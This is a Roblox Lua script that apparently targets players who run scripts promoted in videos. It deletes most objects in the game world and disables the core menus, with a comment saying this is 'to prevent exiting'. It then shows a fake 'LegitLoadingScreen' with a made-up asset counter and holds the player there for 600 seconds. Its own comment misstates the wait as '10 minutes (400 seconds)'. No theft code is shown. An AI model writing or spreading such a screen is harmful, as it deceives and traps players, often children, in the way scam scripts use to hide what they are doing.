local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Hide CoreGui to prevent exiting
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

-- Remove workspace clutter
for _, v in ipairs(workspace:GetChildren()) do
	if not (v:IsA("Camera") or v:IsA("Terrain") or Players:GetPlayerFromCharacter(v)) then
		v:Destroy()
	end
end

-- Create GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LegitLoadingScreen"
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false
screenGui.Parent = PlayerGui

local bg = Instance.new("Frame", screenGui)
bg.Name = "Background"
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.new(0, 0, 0)

local title = Instance.new("TextLabel", bg)
title.Text = "Please wait while executing the script in the video <3"
title.Font = Enum.Font.FredokaOne
title.TextScaled = true
title.TextColor3 = Color3.fromRGB(200, 200, 200)
title.BackgroundTransparency = 1
title.Size = UDim2.new(0.8, 0, 0.1, 0)
title.Position = UDim2.new(0.1, 0, 0.15, 0)

local barBg = Instance.new("Frame", bg)
barBg.Size = UDim2.new(0.6, 0, 0.05, 0)
barBg.Position = UDim2.new(0.2, 0, 0.4, 0)
barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)

local bar = Instance.new("Frame", barBg)
bar.Size = UDim2.new(0, 0, 1, 0)
bar.BackgroundColor3 = Color3.fromRGB(120, 120, 255)

local percent = Instance.new("TextLabel", bg)
percent.Size = UDim2.new(0.2, 0, 0.05, 0)
percent.Position = UDim2.new(0.4, 0, 0.48, 0)
percent.Text = "0%"
percent.Font = Enum.Font.FredokaOne
percent.TextScaled = true
percent.BackgroundTransparency = 1
percent.TextColor3 = Color3.new(1, 1, 1)

local assetText = Instance.new("TextLabel", bg)
assetText.Size = UDim2.new(0.6, 0, 0.05, 0)
assetText.Position = UDim2.new(0.2, 0, 0.56, 0)
assetText.Text = "Loading Assets: 0/1000"
assetText.Font = Enum.Font.FredokaOne
assetText.TextScaled = true
assetText.BackgroundTransparency = 1
assetText.TextColor3 = Color3.new(1, 1, 1)

-- Animate loading
local assetsLoaded = 0
local goal = 1000

for i = 1, goal do
	assetsLoaded += 1
	assetText.Text = "Loading Assets: " .. assetsLoaded .. "/" .. goal
	percent.Text = math.floor((assetsLoaded / goal) * 100) .. "%"
	bar:TweenSize(UDim2.new(assetsLoaded / goal, 0, 1, 0), "Out", "Linear", 0.03, true)
	wait(0.005)
end

-- Wait 10 minutes (400 seconds) before closing GUI
wait(600)

-- Restore CoreGui and remove loading screen
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
screenGui:Destroy()
